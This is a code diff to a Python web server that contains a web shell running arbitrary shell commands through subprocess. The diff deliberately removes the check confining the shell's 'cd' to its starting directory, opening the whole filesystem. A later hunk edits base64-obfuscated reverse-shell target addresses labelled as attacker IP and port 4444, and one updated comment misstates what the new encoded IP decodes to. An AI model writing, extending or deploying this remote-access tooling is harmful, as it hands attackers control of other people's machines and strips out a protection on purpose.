@@ -225,33 +225,50 @@ class WebServerRequestHandler(http.server.SimpleHTTPRequestHandler):
         try:
             if command.strip().startswith("cd"):
                 new_dir_part = command.strip()[len("cd"):].strip()
+                # Strip quotes if present
                 if len(new_dir_part) > 1 and new_dir_part.startswith('"') and new_dir_part.endswith('"'): new_dir_part = new_dir_part[1:-1]
                 elif len(new_dir_part) > 1 and new_dir_part.startswith("'") and new_dir_part.endswith("'"): new_dir_part = new_dir_part[1:-1]
 
                 if not new_dir_part:
+                     # Handle 'cd' with no arguments (print current dir)
                      output = f"Current directory: {current_shell_dir}\n"
                 else:
+                    # Calculate the absolute target path based on the *current* shell directory
                     target_path = os.path.abspath(os.path.join(current_shell_dir, new_dir_part))
-                    abs_initial_shell_cwd = os.path.abspath(INITIAL_SHELL_CWD)
-                    print(f"[_execute_command cd] Target path: {target_path}")
-                    print(f"[_execute_command cd] Initial shell CWD: {abs_initial_shell_cwd}")
+                    print(f"[_execute_command cd] Target path calculation: {target_path}")
 
-                    if not target_path.startswith(abs_initial_shell_cwd + os.sep) and target_path != abs_initial_shell_cwd:
-                        output = f"Error: Cannot 'cd' outside initial directory ({INITIAL_SHELL_CWD}).\n"
-                        print(f"[_execute_command cd] Denied CD outside initial boundary.")
-                    elif os.path.isdir(target_path):
+                    # --- !!! SECURITY WARNING !!! ---
+                    # The following boundary check has been REMOVED.
+                    # This allows the web shell 'cd' command to navigate
+                    # anywhere on the filesystem accessible by the process.
+                    # This significantly increases security risks.
+                    # --- START REMOVED/COMMENTED BLOCK ---
+                    # abs_initial_shell_cwd = os.path.abspath(INITIAL_SHELL_CWD)
+                    # print(f"[_execute_command cd] Initial shell CWD (for reference): {abs_initial_shell_cwd}")
+                    # # Check if the target path is outside the initial allowed directory
+                    # if not target_path.startswith(abs_initial_shell_cwd + os.sep) and target_path != abs_initial_shell_cwd:
+                    #     output = f"Error: Cannot 'cd' outside initial directory ({INITIAL_SHELL_CWD}).\n"
+                    #     print(f"[_execute_command cd] Denied CD outside initial boundary.")
+                    # --- END REMOVED/COMMENTED BLOCK ---
+
+                    # Check if the calculated target path is a valid directory
+                    if os.path.isdir(target_path):
+                        # Update the class variable holding the shell's CWD
                         WebServerRequestHandler.shell_current_directory = target_path
-                        new_shell_dir = target_path # Update the new directory
+                        new_shell_dir = target_path # Update the directory to be returned in JSON
                         output = f"Changed directory to: {new_shell_dir}\n"
-                        print(f"[_execute_command cd] Directory changed to: {new_shell_dir}")
+                        print(f"[_execute_command cd] Directory changed successfully to: {new_shell_dir}")
                     else:
+                        # Target path is not a valid directory
                         output = f"Error: Directory not found or not a directory: {target_path}\n"
-                        print(f"[_execute_command cd] Target path not a directory.")
+                        print(f"[_execute_command cd] Target path not a valid directory.")
             else:
+                # --- Execute other commands using subprocess ---
                 print(f"[_execute_command subprocess] Running command in: {current_shell_dir}")
+                # Use the current_shell_dir (which might have been changed by 'cd')
                 result = subprocess.run(
                     command, shell=True, capture_output=True, text=True,
-                    errors='ignore', cwd=current_shell_dir, timeout=30
+                    errors='ignore', cwd=current_shell_dir, timeout=30 # Use the potentially changed CWD
                 )
                 print(f"[_execute_command subprocess] Return code: {result.returncode}")
                 output = result.stdout + result.stderr
@@ -269,6 +286,7 @@ class WebServerRequestHandler(http.server.SimpleHTTPRequestHandler):
             traceback.print_exc()
             print(f"--- [!!! END _execute_command ERROR !!!] ---")
 
+        # Return the output and the potentially updated CWD for the web shell
         result_data = {"output": output, "cwd": new_shell_dir}
         print(f"[_execute_command] Returning: {result_data}")
         return result_data
@@ -924,7 +942,8 @@ def start_combined_server():
 
 # Obfuscated target IP addresses and port (REVERSE SHELL TARGET)
 encoded_target_1 = "bG9jYWxob3N0"  # Base64 encoded "localhost"
-encoded_target_2 = "MTAuNC4xLjcx"  # Base64 encoded "10.4.1.71" <<-- Attacker IP
+#encoded_target_2 = "MTAuNC4xLjcx"  # Base64 encoded "10.4.1.71" <<-- Attacker IP
+encoded_target_2 = "MTAuNC4wLjE5MA=="  # Base64 encoded "10.4.1.71" <<-- Attacker IP
 encoded_target_3 = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
 encoded_port = "NDQ0NA=="        # Base64 encoded "4444" <<-- Attacker Port
 target_port = int(base64.b64decode(encoded_port).decode())
